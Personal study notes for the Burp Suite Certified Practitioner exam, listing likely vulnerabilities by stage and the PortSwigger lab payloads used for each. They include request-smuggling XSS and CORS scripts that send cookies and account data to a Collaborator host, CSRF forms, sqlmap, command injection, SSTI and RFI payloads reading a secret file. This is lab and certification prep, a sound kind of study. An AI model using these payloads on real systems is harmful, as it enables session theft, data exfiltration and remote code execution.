
![[Likely Vulns on the Exam-20260222193745005.png]]


**Stage 1**
- Forgot password
	- [[Host Headers#1.1 Lab Basic password reset poisoning ⭕️]]
- `/resources/js/tracking.js`
	- [[Web Cache Poisoning#1.1. Lab Web cache poisoning with an unkeyed header ⭕️]]
- Password reset
	- [[Password Reset#2.3. Lab Password reset broken logic ⭕️]]
- HTTP Request Smuggling 
	- But it requires the `User-Agent` to be reflected in the response for payload to work
	- [[Others#1.x. Lab HTTP request smuggling, obfuscating the TE header ⭕️]]
- Search
	- Target scan to ID the specific XSS lab

**Stage 2**
- Admin panel
	- [[Access Control#2.3. Lab User role controlled by request parameter ⭕️]]
- Advanced search
	- Target scan / SQLmap to ID specific SQLi lab
- AJAX request
	- [[Burp Exam Notes/Stage 2/CORS#2.3. Lab CORS vulnerability with trusted insecure protocols ⭕️]]
- `isloggedin`
	- [[CSRF#If a `isloggedin` value is identified in a cookie]]
- Change email
	- [[CSRF#2.5. Lab CSRF where token is tied to non-session cookie ⭕️]]
- JWT
	- Any of the JWT labs

**Stage 3**
- XML file import user / OS command injection inside XXE admin user import
	- [[XXE#Admin user import via XML]]
- Path traversal
	- Any of the LFI labs
- Admin panel
	- Download report
		- [[PDF Download Feature#HTML to PDF]]
	- Config password reset email template
		- [[SSTI#Admin panel Password Reset Email SSTI]]
	- Upload image RFI
		- [[Upload Image from URL#Remote File Inclusion]]


### STAGE 1
These are based on that grid image. Still good notes.
**BRUSH UP ON HOST HEADER + CACHE POISONING** 

- Identify valid user accounts with password reset function
	- [[Brute Force#1.1 Lab Username enumeration via different responses ⭕️]]
	- Valid username message will say "Please check your email..."
	- Invalid username message will say "Please check your email... If it hasn't arrived after five minutes..."

- HTTP Request Smuggling (XSS via User-Agent)
	- [[CL.TE#1.7. Lab Exploiting HTTP request smuggling to deliver reflected XSS ⭕️]]

Payloads
```
- TE.CL with " bypass- 

POST / HTTP/1.1

Content-Length: 5
Transfer-Encoding: "chunked"

330
GET /post?postId=4 HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: a"/><script>document.location='http://<BURP-COLLABORATOR>/?c='+document.cookie;</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Cookie: <COOKIE>

x=1
0
```

```
- CL.TE -

POST / HTTP/1.1

Transfer-Encoding: chunked
Transfer-Encoding: ORHFSuL
Content-Length: 25

f
du60v=x&h94ed=x
0

GET /post?postId=1 HTTP/1.1
Host: <CHANGE>
User-Agent: "><script>alert(document.cookie);var x=new XMLHttpRequest();x.open("GET","https://<BURP-COLLABORATOR>?cookie="+document.cookie);x.send();</script>
Cookie: <COOKIE>
```

- Search bar "Tag is not allowed"
	- Payload used 
```
<iframe src="https://<EXAM URL>/?searchterm='<body onload=%22eval(atob('<BASE64 ENCODE>'))%22>//" onload="this.onload=";this.src ='#XSS'"></iframe>
```

```
<iframe src="https://<EXAM URL>/?searchterm=%22%3E%3Cbody%20onload=%22document.location%22%5D%3D%22https%3A%2F%2F<BUPR-COLLABORATOR/?c='+document.cookie"%22%3E//>">
```


### STAGE 2
- CORS AJAX Account API and session cookie from admin
	- [[Burp Exam Notes/Stage 2/CORS#2.1. Lab CORS vulnerability with basic origin reflection ⭕️]]
	- XSS on Check stock?
If this gets an alert
```
https://stock.LAB-ID.web-security-academy.net/?productId=<script>alert(1)</script>&storeId=2
```

Code
```
<script>
var req = new XMLHttpRequest();

req.onload=sendAPI;
req.withCredentials = true;
req.open('GET','https://LAB-ID.web-security-academy.net/accountDetails',true);
req.send();

function sendAPI(){
  location='https://OASTIFY.COM?api='+btoa(req.responseText);
};
</script>
```

Payload using `location`
```
<script>
  location="http://stock.LAB-ID.web-security-academy.net/?productId=%3cscript>var req = new XMLHttpRequest();req.onload=sendAPI;req.withCredentials = true;req.open('GET','https://LAB-ID.web-security-academy.net/accountDetails',true);req.send();function sendAPI(){  location='https://OASTIFY.COM?api='%2Bbtoa(req.responseText);};%3c/script>&storeId=5"
</script>
```

Alternative payload using `iframe` and Null Origin
```
<iframe sandbox="allow-scripts" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload= sendAPI;
req.withCredentials = true;
req.open('GET','https://LAB-ID.web-security-academy.net/accountDetails',true);
req.send();
function sendAPI() {
  location='https://OATSIFY.COM?api='+btoa(req.responseText);
};
</script>"</iframe>
```


- CSRF Refresh Password (COOKIE -> isloggedin : true)
	- [[CSRF#If a `isloggedin` value is identified in a cookie]]


- CSRF change email admin formid
	- Use the payload below if we can change our email with the csrf token removed
	- *Change `ATTACKER@EMAIL.COM` to your exam's attacker email address.*
```
<html>
<meta name="referrer" content="no-referrer">
  <body>
    <form action="https://LAB-ID.web-security-academy.net/my_account/changeemail" method="POST">
      <input type="hidden" name="email" value="ATTACKER@EMAIL.COM" />
      <input type="hidden" name="form&#45;id" value="HfWYqd" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```


- Review this lab: **SQL injection with filter bypass via XML encoding**
	- `POST /product/stock` uses XML
		- [[SQLi#2.18. Lab SQL injection with filter bypass via XML encoding ⭕️]]

SQLmap command for this lab because SQLmap won't be able to find it. 
*Will need to test `productId` and `storeId`*
*Try the manual method in the meantime SQLmap is running*
```
sqlmap -u 'https://<lab_id>.web-security-academy.net/product/stock' -X POST --header 'Content-Type: application/xml' --data '<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>' -p storeId --level 5 --risk 3 --tamper hex2char --batch
```

- **Skipped over some**
	- https://py-us3r.github.io/bscp-roadmap-bscproadmap/#

### STAGE 3
- OS Command Injection inside XML admin user import
```
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user>
        <username>Example1</username>
        <email>example1@domain.com&`nslookup -q=cname $(cat /home/carlos/secret).BURP-COLLABORATOR`</email>
    </user>
</users>
```

- Admin Panel Download report as PDF SSRF
```
{
  "table-html":"<div><p>Report Heading</p><iframe src='http://localhost:6566/home/carlos/secret'>"
}
```

- File Path Traversal (admin_img)
	- If the word `secret` is blocked for whatever reason, URL encode it.
```
GET /adminpanel/admin_img?filename=..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome/carlos/%252537%33%2536%2536%2533%2537%32%2536%35%2537%34
```

- admin_panel Config the password reset email template SSTI
	- [[SSTI#3.3. Lab Server-side template injection using documentation ⭕️]]

```
# How to identify SSTI

Trigger the email (e.g. submit a password reset for a test account) and check if the email body shows `49` instead of `${7*7}`. If it does — you have SSTI.

**Step 3 — Fingerprint the template engine** Different engines use slightly different syntax. A common decision tree:

${7*7} works → likely **Freemarker** or **Jinja2**
{{7*7}} works → likely **Jinja2** or **Twig**
<%= 7*7 %> works → likely **ERB (Ruby)**
#{7*7} works → likely **Ruby**
```

Payloads
```
# freemaker
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/secret').toURL().openStream().readAllBytes()?join(",")}

# cleaner payload freemaker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /home/carlos/secret")}

# Twig
{{['cat /home/carlos/secret']|filter('system')}}

# jinja2
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /home/carlos/secret').read() }}
```


- Upload image from URL RFI (admin panel)
```
# 1. Paste in exploit server body
<?php echo file_get_contents('/home/carlos/secret'); ?>

# 2. File is hosted at something like:
https://exploit-server.net/exploit.php

# 3. Submit your exploit server URL as the image URL
In the admin panel's URL field, paste your exploit server URL instead of a real image URL: https://exploit-server.net/exploit.php
```



TIPS
- If any of the vulnerabilities from labs [**SSRF via flawed request parsing**](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing), [**Web cache poisoning via ambiguous requests**](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests) and [**Host validation bypass via connection state attack**](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack) are on your exam, the active scanner might not detect them. For that reason, if you run out of ideas, try the manual exploits or techniques required to complete those challenges.
- Check for git exposure at the application root, as you would in lab [**Information disclosure in version control history**](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history). I’m not sure if this can appear on the exam, but the active scanner failed to detect the vulnerability when scanning the homepage a few times.
- If your exam includes **OAuth** authentication and you become stuck, try the [**SSRF via OpenID dynamic client registration**](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration) exploit.
- If, in the final stage of any application, there’s a feature that retrieves images/files by passing a path via a **GET** or **POST** parameter and you get stuck, try the solution from lab [**File path traversal, validation of file extension with null byte bypass**](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass). The active scanner failed to detect the flaw on a few occasions.
- The flaw in the lab [**JWT authentication bypass via kid header path traversal**](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal) won’t be identified by the active scanner. If the application uses **JWT**-based authorization and you get stuck, it’s worth trying.

- Stuck on stage 2: got admin access by passing incorrect values to an endpoint, generating a correctly-signed cookie with an incorrect username.

- It was an endpoint that takes an image filename and its resolution I thought it had an LFI vulnerability and tested it with a lot of payloads and encoding techniques till the exam ended, but sadly the resolution parameter was the vulnerable parameter.
